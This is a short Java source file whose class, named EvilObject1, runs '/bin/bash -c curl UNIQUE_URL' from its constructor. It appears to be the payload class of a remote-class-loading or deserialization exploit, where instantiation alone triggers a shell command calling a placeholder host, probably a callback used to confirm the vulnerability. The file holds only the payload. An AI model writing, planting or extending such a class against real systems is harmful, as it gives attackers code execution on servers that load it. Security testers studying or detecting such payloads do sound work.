public class EvilObject1 {
    public EvilObject1() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/bash", "-c", " curl UNIQUE_URL"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
